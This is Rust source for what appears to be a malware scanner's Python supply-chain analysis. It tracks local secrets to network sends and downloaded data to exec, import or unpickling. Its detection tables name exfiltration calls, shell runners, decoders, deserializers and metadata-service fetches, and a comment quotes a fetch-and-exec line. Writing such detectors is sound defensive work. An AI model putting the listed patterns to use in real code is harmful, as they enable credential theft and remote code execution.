//! The supply-chain model of the Python pass (phase 3 step 3 of the Rust-first
//! refactor, docs/RUST_ENGINE.md §8 and §19): local data — what a script reads
//! from the machine — followed on the parsed tree through names, the script's
//! own functions (their summaries), methods and members of `self`, closures and
//! module globals to a network send; and data the script receives over the
//! network followed to code run, a module loaded or a deserializer. It answers
//! what `flow::local_data_sent_at` and `received::received_code_kind` answer on
//! raw text, with names resolved by scope instead of followed by name within a
//! window of text: a quote in a comment, a name that means two things, or
//! thousands of assignments of padding change nothing. A text the parser
//! doesn't read, or a reading past the pass's budgets, is the text detectors'
//! to answer.
//!
//! JavaScript's model (jsflow/supply.rs) is the reference: the same kinds,
//! categories and rules of precedence, the same tables of the rule pack for
//! what counts as local data (`_LD_MODULE_NAMES`, `_LD_READERS`,
//! `flow::ld_outside`, `shell::sh_output_data`, the instance's metadata and
//! the public-IP services), with Python's calls for sends, connections,
//! clients, runners, importers and deserializers.

use super::eval::{key, Analyzer};
use super::*;
use crate::flow::LiteralTest;
use crate::jsflow::supply::{
    bit_index, cred_store, shown_what, decoded_at, downloads, harvest_of, host_prefix, interp_name, kind_bit, record_written, received_cat,
    first_drop, is_flag, run_parts, script_interp, text_key, value_key, written_at, Answer, DropRun, Part, Written, DESERIALIZE, ENV_NAME, EVAL_FLAGS, EXEC_CMD, HARVEST, INTERPRETERS,
    KIND_NAMES, K_ADDRESS, K_BYTES, K_CARVED, K_CREDENTIALS, K_CRED_FILE, K_ENV, K_FILE, K_DECODED, K_IDENTITY, K_OWN, K_PATH,
    K_RECEIVED, K_WFILE, K_WHOLE_ENV, LOAD_NAME, NOT_LOCAL, OBJ_CLIENT, OBJ_CONN, OBJ_ENV, READ_PATH, RUN_CODE, SEND_ADDR,
    SEND_DATA, STRONG_IN_ADDRESS,
};
use crate::jsflow::Sc;
use crate::pack::Pack;
use std::cell::RefCell;
use std::collections::{HashMap, HashSet};
use std::sync::Arc;

fn u(s: &str) -> PyStr {
    pystr::u(s)
}

/// A value's mark: its parameters are a request's address, and it is what
/// the request receives (`def load(u): exec(requests.get(u).text)`): run,
/// loaded or deserialized, a call given its own address runs code it
/// receives.
pub const FETCHED: u8 = 128;
/// A value's mark: a request object the script made (`urllib.request.Request`):
/// handed to a send, it is what is sent (its data), not only an address.
pub const OBJ_REQUEST: u8 = 32;
/// A request object addressed to the instance's metadata service, or to a
/// public-IP service: what it gets is the credentials, the address.
pub const OBJ_IMDS: u8 = 1;
pub const OBJ_PUBLIC_IP: u8 = 2;
/// The categories a parameter's reach is recorded under for those: the
/// address of what is run, loaded, deserialized.
pub const FETCH_RUN: u8 = 8;
pub const FETCH_LOAD: u8 = 9;
pub const FETCH_DESERIALIZE: u8 = 10;

fn fetch_cat(cat: u8) -> Option<u8> {
    match cat {
        RUN_CODE => Some(FETCH_RUN),
        LOAD_NAME => Some(FETCH_LOAD),
        DESERIALIZE => Some(FETCH_DESERIALIZE),
        _ => None,
    }
}

/// The received-code category a fetch category's sink is.
fn fetched_name(cat: u8) -> Option<&'static str> {
    match cat {
        FETCH_RUN => received_cat(RUN_CODE),
        FETCH_LOAD => received_cat(LOAD_NAME),
        FETCH_DESERIALIZE => received_cat(DESERIALIZE),
        _ => None,
    }
}

fn eq(a: &[u32], b: &str) -> bool {
    pystr::eq(a, b)
}

/// A set of names a callee's or a method's name is tested against: a
/// table (below), or a list written where it is asked.
trait NameSet {
    fn holds(&self, name: &[u32]) -> bool;
}

impl NameSet for [&str] {
    fn holds(&self, name: &[u32]) -> bool {
        self.iter().any(|s| eq(name, s))
    }
}

impl<const N: usize> NameSet for [&str; N] {
    fn holds(&self, name: &[u32]) -> bool {
        self[..].holds(name)
    }
}

/// A table of names, with the lengths and first characters its names have:
/// the models ask about every call, and most names are none of a table's,
/// which these two answer without a comparison. (A table's names are
/// ASCII, so a name's length in characters is a table name's in bytes.)
struct Table {
    names: &'static [&'static str],
    /// bit n: a name of n characters (63: 63 or more)
    lens: u64,
    /// bit c: a name that starts with ASCII c
    firsts: u128,
}

impl Table {
    const fn new(names: &'static [&'static str]) -> Table {
        let mut lens = 0u64;
        let mut firsts = 0u128;
        let mut i = 0;
        while i < names.len() {
            let b = names[i].as_bytes();
            assert!(!b.is_empty(), "a table's names are not empty");
            let mut j = 0;
            while j < b.len() {
                assert!(b[j] < 0x80, "a table's names are ASCII");
                j += 1;
            }
            lens |= 1u64 << if b.len() >= 63 { 63 } else { b.len() };
            firsts |= 1u128 << b[0];
            i += 1;
        }
        Table { names, lens, firsts }
    }
}

impl NameSet for Table {
    #[inline]
    fn holds(&self, name: &[u32]) -> bool {
        let n = name.len().min(63);
        if self.lens & (1u64 << n) == 0 {
            return false;
        }
        match name.first() {
            Some(&c) if c < 0x80 && self.firsts & (1u128 << c) != 0 => self.names.holds(name),
            _ => false,
        }
    }
}

fn is_one<S: NameSet + ?Sized>(name: &[u32], set: &S) -> bool {
    set.holds(name)
}

fn last(name: &[u32]) -> &[u32] {
    last_part(name)
}

// ---------------------------------------------------------------- the model --

/// The supply-chain model of one Python text: the pack, the text (its spans
/// are what the text follower's tests read) and what is known before
/// reading.
pub struct Supply {
    pub pack: Arc<Pack>,
    pub text: Vec<u32>,
    pub lit: LiteralTest,
    /// the names that hold a path outside the package (core's `outside`)
    pub outside: RefCell<HashSet<PyStr>>,
    /// what each of them was first given (the text), for what a read names
    pub outside_values: RefCell<HashMap<PyStr, PyStr>>,
    pub whole: PyStr,
    /// the constant strings a name of a function holds (sc_const_strs)
    const_memo: RefCell<HashMap<(FnId, PyStr), Option<Vec<PyStr>>>>,
    /// which functions have defs nested in them (built when first asked)
    nesting: RefCell<Option<Vec<bool>>>,
    /// what the script stores in a variable of the environment
    /// (`os.environ['P'] = …`), read back where it reads that variable
    pub env_store: RefCell<HashMap<PyStr, Taint>>,
    /// the names the module assigns (a bare name it doesn't is a library's)
    stored: RefCell<Option<HashSet<PyStr>>>,
    /// a name's alias of a callee (`s = os.system`): the names it resolves to
    alias_memo: RefCell<HashMap<(FnId, PyStr), Vec<PyStr>>>,
    /// each function's assignments of a name and its loops' targets
    fn_index: RefCell<HashMap<FnId, Rc<FnIndex>>>,
    /// the files the script writes code or a program to (a run of one is
    /// a dropper's)
    pub written: RefCell<Vec<Written>>,
    /// where the script reads itself back (`own_starts`), sorted
    pub own_starts: Vec<u32>,
}

/// A function's own assignments: what `name = value` gives each name, and
/// what a `for name in items` loop goes over.
#[derive(Default)]
struct FnIndex {
    assigns: HashMap<PyStr, Vec<NodeId>>,
    loops: HashMap<PyStr, NodeId>,
}

impl Supply {
    pub fn new(pack: Arc<Pack>, text: &[u32]) -> Supply {
        let lit = LiteralTest::new(&pack, text);
        let whole = pack.text("_LD_WHOLE_ENV");
        Supply {
            text: text.to_vec(),
            lit,
            outside: RefCell::new(HashSet::new()),
            outside_values: RefCell::new(HashMap::new()),
            whole,
            const_memo: RefCell::new(HashMap::new()),
            nesting: RefCell::new(None),
            env_store: RefCell::new(HashMap::new()),
            stored: RefCell::new(None),
            alias_memo: RefCell::new(HashMap::new()),
            fn_index: RefCell::new(HashMap::new()),
            written: RefCell::new(Vec::new()),
            own_starts: own_starts(&pack, text),
            pack,
        }
    }

    pub fn p(&self) -> &Pack {
        &self.pack
    }

    pub fn span(&self, lo: u32, hi: u32) -> &[u32] {
        let lo = (lo as usize).min(self.text.len());
        let hi = (hi as usize).min(self.text.len()).max(lo);
        &self.text[lo..hi]
    }
}

/// Where a Python text reads itself back (N-19): the starts of `_SELF_READ_RE`'s matches (a read of its own file,
/// its docstring, its loader's source), `_SIBLING_DATA_RE`'s (a read of a data file shipped with it) and
/// `_SIBLING_PATH_RE`'s (such a file's path), sorted: the text follower's forms, which the model gives `K_OWN` at the
/// call whose callee starts one, or the name (`__doc__`, `__file__`) that does.
fn own_starts(p: &Pack, text: &[u32]) -> Vec<u32> {
    if !["__file__", "__doc__", "__loader__"].iter().any(|w| pystr::contains(text, w)) {
        return Vec::new();
    }
    let mut out: Vec<u32> = Vec::new();
    for name in ["_SELF_READ_RE", "_SIBLING_DATA_RE", "_SIBLING_PATH_RE"] {
        out.extend(p.re(name).finditer(text).map(|m| m.start() as u32));
    }
    out.sort_unstable();
    out.dedup();
    out
}

/// A value without one kind of source (`jsflow::supply::sc_without`'s, for a [`Taint`]).
fn taint_without(v: Taint, bit: u16) -> Taint {
    let sc = match v.sc.as_ref() {
        Some(sc) if sc.kinds & bit != 0 => sc.clone(),
        _ => return v,
    };
    let kinds = sc.kinds & !bit;
    let sc = if kinds == 0 {
        None
    } else {
        let idx = bit_index(bit);
        Some(Rc::new(Sc { kinds, firsts: sc.firsts.iter().filter(|f| f.0 != idx).cloned().collect() }))
    };
    Taint { sc, ..v }
}

/// The send a call is: which of its positional arguments are addresses
/// (-1 all of them, n the first n; a keyword is one when `_LD_OPTION_KEYS`
/// names it), whether only an argument composed with a literal counts (a
/// DNS lookup), and whether it starts a process (its options — `env=`,
/// `cwd=` — are the program's, not sent).
#[derive(Clone, Copy, Debug)]
struct Spec {
    addresses: i8,
    composed: bool,
    process: bool,
}

const SEND1: Spec = Spec { addresses: 1, composed: false, process: false };
const OPTIONS: Spec = Spec { addresses: 0, composed: false, process: false };
const REQUEST2: Spec = Spec { addresses: 2, composed: false, process: false };
const ADDRESS: Spec = Spec { addresses: -1, composed: false, process: false };
const LOOKUP: Spec = Spec { addresses: -1, composed: true, process: false };
const PROCESS: Spec = Spec { addresses: 0, composed: false, process: true };

/// HTTP calls that send their data: the address first.
const POSTS: &Table = &Table::new(&[
    "requests.post", "requests.put", "requests.patch", "requests.api.post", "requests.api.put", "requests.api.patch",
    "httpx.post", "httpx.put", "httpx.patch", "urllib.request.urlopen", "urllib.request.Request", "urllib2.urlopen",
    "urllib2.Request", "six.moves.urllib.request.urlopen", "six.moves.urllib.request.Request", "urllib.urlopen",
]);
/// HTTP calls given a method, then an address.
const REQUESTS: &Table =
    &Table::new(&["requests.request", "requests.api.request", "httpx.request", "httpx.stream", "aiohttp.request", "urllib3.request"]);
/// HTTP calls that send only what their address holds.
const GETS: &Table = &Table::new(&[
    "requests.get", "requests.head", "requests.delete", "requests.options", "requests.api.get", "httpx.get",
    "httpx.head", "httpx.delete", "httpx.options",
]);
/// Calls that resolve a name (a DNS lookup sends what the name holds).
const LOOKUPS: &Table = &Table::new(&[
    "socket.gethostbyname", "socket.gethostbyname_ex", "socket.getaddrinfo", "dns.resolver.resolve",
    "dns.resolver.query",
]);
/// Calls whose value is a connection: what it is written is sent, what it
/// reads is received.
const CONNECTIONS: &Table = &Table::new(&[
    "socket.socket", "socket.create_connection", "socket.fromfd", "ssl.wrap_socket", "http.client.HTTPConnection",
    "http.client.HTTPSConnection", "httplib.HTTPConnection", "httplib.HTTPSConnection", "telnetlib.Telnet",
    "websocket.create_connection", "websocket.WebSocket", "asyncio.open_connection",
]);
/// A connection's methods that send.
const CONN_WRITES: &Table = &Table::new(&["send", "sendall", "sendto", "write", "writelines", "request"]);
/// A connection's methods that receive.
const CONN_READS: &Table = &Table::new(&["recv", "recvfrom", "recv_into", "read", "readline", "readlines", "getresponse", "readexactly"]);
/// Methods that give a connection back (a socket wrapped in TLS, its file).
const CONN_CHAIN: &Table = &Table::new(&["wrap_socket", "makefile", "dup", "accept"]);
/// Calls whose value is an HTTP client: its calls send and receive.
const CLIENTS: &Table = &Table::new(&[
    "requests.Session", "requests.session", "requests.sessions.Session", "httpx.Client", "httpx.AsyncClient",
    "aiohttp.ClientSession", "urllib3.PoolManager", "urllib3.ProxyManager", "urllib3.HTTPConnectionPool",
    "urllib3.HTTPSConnectionPool", "urllib.request.build_opener", "urllib2.build_opener", "cloudscraper.create_scraper",
]);
const CLIENT_POSTS: &Table = &Table::new(&["post", "put", "patch", "open"]);
const CLIENT_REQUESTS: &Table = &Table::new(&["request", "urlopen", "stream"]);
const CLIENT_GETS: &Table = &Table::new(&["get", "head", "delete", "options"]);
/// HTTP calls that receive (their value is the response), from the
/// script's own address.
const RECEIVERS: &Table = &Table::new(&[
    "requests.get", "requests.post", "requests.put", "requests.patch", "requests.delete", "requests.head",
    "requests.options", "requests.request", "requests.api.get", "requests.api.post", "requests.api.request", "httpx.get",
    "httpx.post", "httpx.put", "httpx.patch", "httpx.delete", "httpx.head", "httpx.options", "httpx.request",
    "httpx.stream", "urllib.request.urlopen", "urllib2.urlopen", "six.moves.urllib.request.urlopen", "aiohttp.request",
    "urllib3.request", "urllib.urlopen",
]);
/// The calls that fetch (the instance's metadata, the public IP address).
const FETCHERS: &Table = &Table::new(&["requests.get", "httpx.get", "urllib.request.urlopen", "urllib2.urlopen", "urllib.urlopen"]);
/// The calls that make a request object.
const REQUEST_OBJECTS: &Table =
    &Table::new(&["urllib.request.Request", "urllib2.Request", "six.moves.urllib.request.Request", "requests.Request"]);
/// Calls that run a command line and give what it prints.
const CAPTURES: &Table = &Table::new(&[
    "subprocess.check_output", "subprocess.getoutput", "subprocess.getstatusoutput", "subprocess.run",
    "subprocess.Popen", "os.popen", "commands.getoutput", "commands.getstatusoutput", "asyncio.create_subprocess_shell",
    "asyncio.create_subprocess_exec",
]);
/// Calls that start a process (a network program given data sends it).
const PROCESSES: &Table = &Table::new(&[
    "subprocess.check_output", "subprocess.getoutput", "subprocess.getstatusoutput", "subprocess.run",
    "subprocess.Popen", "subprocess.call", "subprocess.check_call", "os.popen", "os.system", "commands.getoutput",
    "commands.getstatusoutput", "asyncio.create_subprocess_shell", "asyncio.create_subprocess_exec",
]);
/// Calls that run a command line through a shell (its text is code).
const SHELLS: &Table = &Table::new(&[
    "os.system", "os.popen", "subprocess.getoutput", "subprocess.getstatusoutput", "commands.getoutput",
    "commands.getstatusoutput", "asyncio.create_subprocess_shell", "pty.spawn",
]);
/// Calls that start a process from an argument list (shell=True makes the
/// first a shell's command line).
const SPAWNS: &Table =
    &Table::new(&["subprocess.run", "subprocess.call", "subprocess.check_call", "subprocess.check_output", "subprocess.Popen"]);
/// Calls that run a program named by their first argument.
const PROGRAM_RUNS: &Table = &Table::new(&[
    "os.startfile", "os.execv", "os.execve", "os.execl", "os.execle", "os.execlp", "os.execlpe", "os.execvp", "os.execvpe",
    "os.posix_spawn", "os.posix_spawnp", "asyncio.create_subprocess_exec",
]);
/// Calls that run a program named by their second argument (the first is a mode).
const MODE_RUNS: &Table =
    &Table::new(&["os.spawnv", "os.spawnve", "os.spawnl", "os.spawnle", "os.spawnlp", "os.spawnlpe", "os.spawnvp", "os.spawnvpe"]);
/// Calls that open a file by its path (their second argument the mode).
const OPENERS: &Table = &Table::new(&["open", "io.open", "codecs.open", "builtins.open"]);
/// Calls that give back the path they are given, as a string or a path.
const PATH_WRAPPERS: &Table = &Table::new(&[
    "str", "os.fspath", "os.path.abspath", "os.path.realpath", "os.path.normpath", "os.path.expanduser", "pathlib.Path",
]);
/// The path types (`Path(p)` is p).
const PATH_TYPES: &Table = &Table::new(&["Path", "PurePath", "PosixPath", "WindowsPath"]);
/// Calls that run code (`_DL_RUNNER`'s Python).
const RUNNERS: &Table = &Table::new(&["exec", "eval", "builtins.exec", "builtins.eval", "execfile", "__builtins__.exec", "__builtins__.eval"]);
/// Parsers of a command line given its usage text (`ArgumentParser(description=__doc__)`, `docopt(__doc__)`): what
/// they give is the command line's, never the text's (N-19).
const USAGE_PARSERS: &Table = &Table::new(&["argparse.ArgumentParser", "optparse.OptionParser", "docopt.docopt"]);
/// Calls that load a module by name.
const IMPORTERS: &Table = &Table::new(&["importlib.import_module", "__import__", "builtins.__import__", "importlib.__import__"]);
/// Deserializers that run code in what they read (`_DL_DESERIAL`).
const DESERIALIZERS: &Table = &Table::new(&[
    "pickle.loads", "pickle.load", "pickle.Unpickler", "cPickle.loads", "cPickle.load", "_pickle.loads", "_pickle.load",
    "dill.loads", "dill.load", "cloudpickle.loads", "cloudpickle.load", "marshal.loads", "marshal.load",
    "jsonpickle.decode", "yaml.unsafe_load", "yaml.load",
]);
/// A thread's or an executor's call of a function (its arguments: what the
/// function is given).
const STARTERS: &Table = &Table::new(&["threading.Thread", "multiprocessing.Process", "threading.Timer"]);
/// Calls whose value is a number or a flag, not the data they are given (a
/// length, a test, a checksum). A digest, a character's code or a number
/// written out still carry it: `md5(host).hexdigest()` is the machine's id,
/// `[ord(c) for c in host]` its name (KEEPS).
const NUMERIC: &Table = &Table::new(&["len", "bool", "hash", "id", "abs", "round", "sum", "isinstance"]);
/// Calls the pass reads as clean whose value still identifies what they are given.
const KEEPS: &Table = &Table::new(&["hexdigest", "digest", "ord"]);
/// A container's methods that put what they are given into it.
const COLLECTS: &Table = &Table::new(&["append", "extend", "add", "update", "insert", "setdefault", "appendleft", "put"]);
/// Calls that decode what they are given (`_DECODER_NAMES` with their
/// modules): what they return is decoded data; run as code, it is code the
/// script decodes.
const DECODERS: &Table = &Table::new(&[
    "base64.b64decode", "base64.standard_b64decode", "base64.urlsafe_b64decode", "base64.b32decode",
    "base64.b32hexdecode", "base64.b16decode", "base64.a85decode", "base64.b85decode", "base64.z85decode",
    "base64.decodebytes", "base64.decodestring", "binascii.unhexlify", "binascii.a2b_base64", "binascii.a2b_hex",
    "binascii.a2b_uu", "bytes.fromhex", "bytearray.fromhex", "codecs.decode", "zlib.decompress", "gzip.decompress",
    "bz2.decompress", "lzma.decompress", "marshal.loads",
]);
/// Methods that decode: a decryption (`Fernet(k).decrypt(d)`), a
/// decompressor's, `fromhex`.
const DECODER_METHODS: &Table = &Table::new(&["decrypt", "decompress", "fromhex"]);

/// The modules a bare name usually comes from: a snippet that calls
/// `urlopen(u)` without its import is urllib's, and so is one that has it
/// from `from urllib.request import *`.
const BARE: &[(&str, &str)] = &[
    ("urlopen", "urllib.request.urlopen"),
    ("check_output", "subprocess.check_output"),
    ("getoutput", "subprocess.getoutput"),
    ("getstatusoutput", "subprocess.getstatusoutput"),
    ("check_call", "subprocess.check_call"),
    ("Popen", "subprocess.Popen"),
    ("gethostname", "socket.gethostname"),
    ("getfqdn", "socket.getfqdn"),
    ("gethostbyname", "socket.gethostbyname"),
    ("socket", "socket.socket"),
    ("create_connection", "socket.create_connection"),
    ("HTTPConnection", "http.client.HTTPConnection"),
    ("HTTPSConnection", "http.client.HTTPSConnection"),
    ("Request", "urllib.request.Request"),
    ("getuser", "getpass.getuser"),
    ("system", "os.system"),
    ("popen", "os.popen"),
    ("import_module", "importlib.import_module"),
];

/// A callee's name with a namespace's indirections taken out:
/// `__builtins__.__dict__.exec` and `builtins.exec` are `exec`'s,
/// `globals.x` (`globals()['x']`) is x.
fn normalize_name(name: &[u32]) -> PyStr {
    // (the common case, nothing to take out: a part named __dict__, a
    // namespace's head, builtins' module before a name; the name as it is)
    let mut parts_n = 0usize;
    let mut first: &[u32] = &[];
    let mut dict = false;
    for (k, part) in name.split(|&c| c == 0x2E).enumerate() {
        if k == 0 {
            first = part;
        }
        if eq(part, "__dict__") {
            dict = true;
            break;
        }
        parts_n += 1;
    }
    if !dict
        && !(parts_n > 1 && (eq(first, "globals") || eq(first, "vars") || eq(first, "locals")))
        && !(parts_n == 2 && (eq(first, "__builtins__") || eq(first, "builtins")))
    {
        return name.to_vec();
    }
    let mut parts: Vec<&[u32]> = name.split(|&c| c == 0x2E).filter(|p| !eq(p, "__dict__")).collect();
    if parts.len() > 1 && (eq(parts[0], "globals") || eq(parts[0], "vars") || eq(parts[0], "locals")) {
        parts.remove(0);
    }
    if parts.len() == 2 && (eq(parts[0], "__builtins__") || eq(parts[0], "builtins")) {
        parts.remove(0);
    }
    let mut out = Vec::new();
    for (k, p) in parts.iter().enumerate() {
        if k > 0 {
            out.push(0x2E);
        }
        out.extend_from_slice(p);
    }
    out
}

/// Is a callee's name one of a table's?
fn any_of<S: NameSet + ?Sized>(names: &[PyStr], set: &S) -> bool {
    names.iter().any(|n| set.holds(n))
}

/// [`any_of`] for the hooks every call passes through (a table's names are
/// ASCII, so a name of another length is never one of them: [`eq`] says so
/// at once).
fn any_of_ascii<S: NameSet + ?Sized>(names: &[PyStr], set: &S) -> bool {
    any_of(names, set)
}

/// [`is_one`] for an ASCII table (see [`any_of_ascii`]).
fn is_one_ascii<S: NameSet + ?Sized>(name: &[u32], set: &S) -> bool {
    set.holds(name)
}

/// The send a callee's names make, if any.
fn send_spec(names: &[PyStr]) -> Option<Spec> {
    if any_of(names, POSTS) {
        return Some(SEND1);
    }
    if any_of(names, REQUESTS) {
        return Some(REQUEST2);
    }
    if any_of(names, GETS) {
        return Some(ADDRESS);
    }
    if any_of(names, LOOKUPS) {
        return Some(LOOKUP);
    }
    None
}

/// The received-code sink a call is: its category and the argument that is
/// the code.
#[derive(Clone, Copy, Debug)]
struct Runs {
    cat: u8,
    from: usize,
}

// --------------------------------------------------------- the model's pass --

impl<'p> Analyzer<'p> {
    pub(super) fn sup(&self) -> Rc<Supply> {
        self.p.cfg.supply.clone().expect("the supply-chain model")
    }

    pub(super) fn start(&self, n: NodeId) -> u32 {
        self.t().node(n).start
    }

    fn node_text(&self, n: NodeId) -> PyStr {
        let (lo, hi) = {
            let nd = self.t().node(n);
            (nd.start, nd.end)
        };
        self.sup().span(lo, hi).to_vec()
    }

    /// A value read from the machine: `bit` with `what`, read at `at`.
    pub(super) fn sc_source(&self, bit: u16, what: PyStr, at: u32, mark: u8) -> Taint {
        let sup = self.sup();
        let bit = if bit == K_FILE && cred_store(sup.p(), &what) { K_CRED_FILE } else { bit };
        let line = self.t().line_of(at);
        let sc = Sc { kinds: bit, firsts: vec![(bit_index(bit), Rc::new(what), at)] };
        Taint { sc: Some(Rc::new(sc)), marks: mark, ..Taint::src(0, Some((self.m, line)), None) }
    }

    /// One variable of the environment, by its name (and what the script
    /// stored in it).
    fn sc_env_var(&self, name: &[u32], at: u32) -> Taint {
        let stored = self.sup().env_store.borrow().get(name).cloned();
        let v = self.sc_env_var_read(name, at);
        match stored {
            Some(s) => v.union(&s),
            None => v,
        }
    }

    fn sc_env_var_read(&self, name: &[u32], at: u32) -> Taint {
        let sup = self.sup();
        let p = sup.p();
        if p.re("_SH_IDENTITY_VAR_RE").match_(name).is_some() {
            return self.sc_source(K_IDENTITY, name.to_vec(), at, 0);
        }
        if p.re("_SH_SECRET_VAR_RE").search(name).is_some() && p.re("_LD_ENV_QUIET_RE").match_(name).is_none() {
            return self.sc_source(K_ENV, name.to_vec(), at, 0);
        }
        if is_one(name, &["HOME", "USERPROFILE", "APPDATA", "LOCALAPPDATA", "HOMEPATH"]) {
            return self.sc_source(K_PATH, name.to_vec(), at, 0);
        }
        Taint::empty()
    }

    /// A string constant's value (bytes read as Latin-1), if `n` is one.
    pub(super) fn sc_const_str(&self, n: NodeId) -> Option<PyStr> {
        if n == NONE {
            return None;
        }
        let t = self.t();
        if t.kind(n) != Kind::Constant {
            return None;
        }
        let op = t.node(n).op;
        if op == pt::V_STR || op == pt::V_BYTES {
            return Some(t.str(a_(t, n)).to_vec());
        }
        None
    }

    /// The names a callee resolves to: its dotted text with an import alias
    /// at its head replaced (`requests.post`, `urllib.request.urlopen` for
    /// `from urllib.request import urlopen as u; u(…)`), then as written.
    pub(super) fn sc_names(&mut self, func: NodeId) -> Vec<PyStr> {
        self.sc_names_at(func, 0)
    }

    fn sc_names_at(&mut self, func: NodeId, depth: u32) -> Vec<PyStr> {
        let kind = self.t().kind(func);
        if depth < 4 {
            // getattr(x, 'name'): x's member; x['name']: a namespace's (`__builtins__.__dict__['exec']`)
            let member: Option<(NodeId, PyStr)> = {
                let t = self.t();
                match kind {
                    Kind::Call => {
                        let callee = a_(t, func);
                        let args = t.list(b_(t, func));
                        if t.kind(callee) == Kind::Name && eq(t.str(a_(t, callee)), "getattr") && args.len() >= 2 {
                            self.sc_const_str(args[1]).map(|attr| (args[0], attr))
                        } else {
                            None
                        }
                    }
                    Kind::Subscript => self.sc_const_str(b_(t, func)).map(|k| (a_(t, func), k)),
                    _ => None,
                }
            };
            if let Some((obj, attr)) = member {
                let base = self.sc_names_at(obj, depth + 1);
                let mut out: Vec<PyStr> = Vec::new();
                for b in base {
                    let n = normalize_name(&pystr::concat(&[&b, &u("."), &attr]));
                    if !out.contains(&n) {
                        out.push(n);
                    }
                }
                return out;
            }
        }
        let (d, links) = dotted_links(self.t(), func);
        let canon = self.p.canonical(self.m, &d);
        self.p.charge(links + (d.len() + canon.len()) as u64);
        let mut out = Vec::with_capacity(2);
        if !canon.is_empty() {
            out.push(normalize_name(&canon));
        }
        let d = normalize_name(&d);
        if !d.is_empty() && !out.contains(&d) {
            out.push(d);
        }
        if kind == Kind::Name && depth < 4 {
            let text = self.t().str(a_(self.t(), func)).to_vec();
            if !self.sc_bound(&text) {
                // a name no import, definition or assignment binds: the
                // library's it usually is (a snippet that leaves out its import)
                if let Some((_, full)) = BARE.iter().find(|(b, _)| eq(&text, b)) {
                    out.push(u(full));
                }
            } else {
                // a name given a callee: `s = os.system`
                for n in self.sc_alias_names(&text, depth) {
                    if !out.contains(&n) {
                        out.push(n);
                    }
                }
            }
        }
        out
    }

    /// Function `f`'s index of its own assignments (built when first asked).
    fn sc_index(&mut self, f: FnId) -> Rc<FnIndex> {
        if let Some(ix) = self.sup().fn_index.borrow().get(&f) {
            return ix.clone();
        }
        let fnode = self.p.fns[f as usize].node;
        let body: Vec<u32> = body_of(self.t(), fnode).to_vec();
        let nodes = own_nodes(self.t(), &body);
        self.p.charge(nodes.len() as u64);
        let mut ix = FnIndex::default();
        let t = self.t();
        for x in nodes {
            match t.kind(x) {
                Kind::Assign => {
                    let targets = t.list(a_(t, x));
                    if targets.len() == 1 && t.kind(targets[0]) == Kind::Name {
                        let e = ix.assigns.entry(t.str(a_(t, targets[0])).to_vec()).or_default();
                        if e.len() < 9 {
                            e.push(b_(t, x));
                        }
                    }
                }
                Kind::For | Kind::AsyncFor => {
                    let tg = a_(t, x);
                    if t.kind(tg) == Kind::Name {
                        ix.loops.entry(t.str(a_(t, tg)).to_vec()).or_insert(b_(t, x));
                    }
                }
                _ => {}
            }
        }
        let ix = Rc::new(ix);
        self.sup().fn_index.borrow_mut().insert(f, ix.clone());
        ix
    }

    /// Does the module bind `name`: an import, a def or class, an assignment?
    fn sc_bound(&mut self, name: &[u32]) -> bool {
        let sup = self.sup();
        if sup.stored.borrow().is_none() {
            let t = self.t();
            let mut set: HashSet<PyStr> = HashSet::new();
            for id in 0..t.nodes.len() as NodeId {
                if t.kind(id) == Kind::Name && t.node(id).op == pt::STORE {
                    set.insert(t.str(a_(t, id)).to_vec());
                }
            }
            *sup.stored.borrow_mut() = Some(set);
        }
        if sup.stored.borrow().as_ref().is_some_and(|s| s.contains(name)) {
            return true;
        }
        let id = match self.p.names.find(name) {
            Some(k) => k,
            None => return false,
        };
        // (a parameter of the function, or of one around it)
        let mut at = Some(self.f);
        while let Some(f) = at {
            if self.p.fns[f as usize].pnames.contains(&id) || self.p.fns[f as usize].local_names.contains(&id) {
                return true;
            }
            at = self.p.fns[f as usize].parent;
        }
        let md = &self.p.mods[self.m as usize];
        md.imports.contains_key(&id) || md.funcs.contains_key(&id) || md.classes.contains_key(&id) || md.nested.contains_key(&id)
    }

    /// The callees a name is given (`s = os.system`, `e = eval`), in the
    /// function or the module: their names.
    fn sc_alias_names(&mut self, name: &[u32], depth: u32) -> Vec<PyStr> {
        let memo_key = (self.f, name.to_vec());
        if let Some(hit) = self.sup().alias_memo.borrow().get(&memo_key) {
            return hit.clone();
        }
        self.sup().alias_memo.borrow_mut().insert(memo_key.clone(), Vec::new());
        let mut values: Vec<NodeId> = Vec::new();
        let fns = {
            let mut v = vec![self.f];
            let body_fn = self.p.mods[self.m as usize].body_fn;
            if body_fn != self.f {
                v.push(body_fn);
            }
            v
        };
        for f in fns {
            let ix = self.sc_index(f);
            if let Some(vs) = ix.assigns.get(name) {
                let t = self.t();
                values.extend(vs.iter().copied().filter(|&v| matches!(t.kind(v), Kind::Name | Kind::Attribute | Kind::Subscript)));
            }
        }
        values.truncate(4);
        let mut out: Vec<PyStr> = Vec::new();
        for v in values {
            for n in self.sc_names_at(v, depth + 1) {
                if !out.contains(&n) {
                    out.push(n);
                }
            }
        }
        self.sup().alias_memo.borrow_mut().insert(memo_key, out.clone());
        out
    }

    /// supply mode: a name: os.environ imported by its own name, else None.
    pub(super) fn sc_name(&mut self, e: NodeId, name: NameId) -> Option<Taint> {
        if self.env.contains_key(&key(name)) {
            return None;
        }
        let text = self.p.name_text(name).to_vec();
        // (the script read back: its docstring, or its file in a data file's path: `own_starts`)
        if eq(&text, "__doc__") || eq(&text, "__file__") {
            let at = self.start(e);
            if !self.sc_own_in(at, at + 1) {
                return None;
            }
            let what = if eq(&text, "__doc__") { "its docstring" } else { "a file shipped with it" };
            return Some(self.sc_source(K_OWN, u(what), at, 0));
        }
        if !eq(&text, "environ") && !eq(&text, "environb") {
            return None;
        }
        let canon = self.p.canonical(self.m, &text);
        if eq(&canon, "os.environ") || eq(&canon, "os.environb") {
            let whole = self.sup().whole.clone();
            return Some(self.sc_source(K_WHOLE_ENV, whole, self.start(e), OBJ_ENV));
        }
        None
    }

    /// supply mode: does a read of the script itself start in `[lo, hi)` (`own_starts`)?
    fn sc_own_in(&self, lo: u32, hi: u32) -> bool {
        let sup = self.sup();
        let k = sup.own_starts.partition_point(|&s| s < lo);
        k < sup.own_starts.len() && sup.own_starts[k] < hi
    }

    /// supply mode, a call's value (N-19): what the script reads back from itself when an own read starts in the
    /// callee (`open(__file__)`, `Path(__file__).read_text()`, `__loader__.get_source(…)`, a data file's read: its
    /// value and every call it is the callee's receiver of); none out of a parser of a usage text (its command line).
    pub(super) fn sc_own_call(&mut self, call: NodeId, v: Taint) -> Taint {
        let (func, lo) = {
            let t = self.t();
            (a_(t, call), t.node(call).start)
        };
